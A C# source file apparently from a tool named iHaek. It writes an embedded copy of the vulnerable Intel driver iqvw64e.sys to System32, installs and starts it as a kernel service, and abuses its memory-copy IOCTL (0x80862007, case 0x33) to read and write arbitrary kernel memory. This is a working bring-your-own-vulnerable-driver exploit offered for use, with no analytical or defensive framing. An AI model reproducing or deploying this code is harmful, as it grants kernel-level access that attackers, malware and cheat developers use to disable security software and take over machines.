using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using iHaek.Properties;
using iHaek.Utils;

namespace iHaek.iqvw64e;

public unsafe class Wrapper
{
    private const string DriverDisplayName = "iqvw64e";
    private const string DriverFilePath = "C:\\Windows\\System32\\drivers\\iqvw64e.sys";
    private static SafeFileHandle _driverHandle = null!;
    private static IntPtr _serviceHandle;

    private readonly uint _ioctl = 0x80862007;

    public virtual bool DriverIsLoadedAndWorking()
    {
        return !_driverHandle.IsClosed && !_driverHandle.IsInvalid;
    }

    public T ReadMemory<T>(ulong address)
    {
        var valSize = Marshal.SizeOf(typeof(T));
        var allocatedBuffPtr = Marshal.AllocHGlobal(valSize);
        var readResult = MemoryCopy((ulong)allocatedBuffPtr.ToInt64(), address, (ulong)valSize);
        var valResult = (T)Marshal.PtrToStructure(allocatedBuffPtr, typeof(T))!;

        Marshal.FreeHGlobal(allocatedBuffPtr);

        if (readResult)
            return valResult;

        throw new Exception("Read failed");
    }

    public bool WriteMemory<T>(ulong address, T value)
    {
        var valSize = Marshal.SizeOf(typeof(T));
        var allocatedBuffPtr = Marshal.AllocHGlobal(valSize);

        Marshal.StructureToPtr(value!, allocatedBuffPtr, false);

        var writeResult = MemoryCopy(address, (ulong)allocatedBuffPtr.ToInt64(), (ulong)valSize);

        Marshal.FreeHGlobal(allocatedBuffPtr);

        return writeResult;
    }

    public virtual bool LoadDriver()
    {
        Retry:

        if (ServiceHelper.OpenService(out var serviceHandle, DriverDisplayName,
                0x0020 /*SERVICE_STOP*/ | 0x00010000 /*DELETE*/))
        {
            Console.WriteLine(@"[~] Service is exists in system, stop, delete and recreate him");

            if (!ServiceHelper.StopService(serviceHandle))
                Console.WriteLine(@"[~] Couldn't stop service, possible service just not running :D");

            if (!ServiceHelper.DeleteService(serviceHandle))
                Console.WriteLine(@"[!] Couldn't delete service");

            ServiceHelper.CloseServiceHandle(serviceHandle);

            Thread.Sleep(50);

            goto Retry;
        }

        File.WriteAllBytes(DriverFilePath, Resources.iqvw64e);

        Console.WriteLine(@"[+] Loading..");

        var desiredAccess = 0xF0000 /*STANDARD_RIGHTS_REQUIRED*/ | 0x00010 /*SERVICE_START*/ |
                            0x00020 /*SERVICE_STOP*/ | 0x00010000;
        if (!ServiceHelper.CreateService(ref _serviceHandle, DriverDisplayName, DriverDisplayName,
                DriverFilePath, (uint)desiredAccess, 1 /*SERVICE_KERNEL_DRIVER*/, 3 /*SERVICE_DEMAND_START*/,
                1 /*SERVICE_ERROR_NORMAL*/))
        {
            Console.WriteLine($@"[!] Failed to create service - {Marshal.GetLastWin32Error():X}");
            return false;
        }

        if (!ServiceHelper.StartService(_serviceHandle))
        {
            Console.WriteLine($@"[!] Failed to start service - {Marshal.GetLastWin32Error():X}");
            ServiceHelper.DeleteService(_serviceHandle);
            return false;
        }

        Console.WriteLine(@"[+] Opening connection to driver");

        _driverHandle = pInvoke.CreateFile("\\\\.\\Nal",
            0x80000000 /*GENERIC_READ*/ | 0x40000000 /*GENERIC_WRITE*/, 0, IntPtr.Zero, 0x3 /*OPEN_EXISTING*/, 0,
            IntPtr.Zero);
        if (_driverHandle.IsClosed || _driverHandle.IsInvalid)
        {
            Console.WriteLine($@"[!] Failed to connect to driver! - {Marshal.GetLastWin32Error():X}");
            return false;
        }

        Console.WriteLine($@"[+] ServiceHandle: 0x{_serviceHandle.ToString("X2")}");
        Console.WriteLine($@"[+] DriverHandle: 0x{_driverHandle.DangerousGetHandle().ToString("X2")}");

        return true;
    }

    public static bool UnloadDriver()
    {
        _driverHandle.Close();
        _driverHandle.Dispose();

        var stopResult = ServiceHelper.StopService(_serviceHandle);

        var deleteResult = false;

        if (stopResult)
            deleteResult = ServiceHelper.DeleteService(_serviceHandle);
        else
            Console.WriteLine(@"[!] Couldn't stop driver service");

        if (!deleteResult)
            Console.WriteLine(@"[!] Couldn't delete driver service");

        ServiceHelper.CloseServiceHandle(_serviceHandle);

        return stopResult && deleteResult;
    }

    private bool MemoryCopy(ulong destination, ulong source, ulong length)
    {
        if (destination == 0 || source == 0 || length == 0 || _driverHandle.IsClosed)
            return false;

        var request = new COPY_MEMORY_BUFFER_INFO
        {
            CaseNumber = 0x33,
            Reserved = 0,
            Source = source,
            Destination = destination,
            Length = length
        };

        return pInvoke.DeviceIoControl(_driverHandle, _ioctl, (UIntPtr)(&request), sizeof(COPY_MEMORY_BUFFER_INFO),
            UIntPtr.Zero, 0, out _, IntPtr.Zero);
    }

    private struct COPY_MEMORY_BUFFER_INFO
    {
        public ulong CaseNumber;
        public ulong Reserved;
        public ulong Source;
        public ulong Destination;
        public ulong Length;
    }
}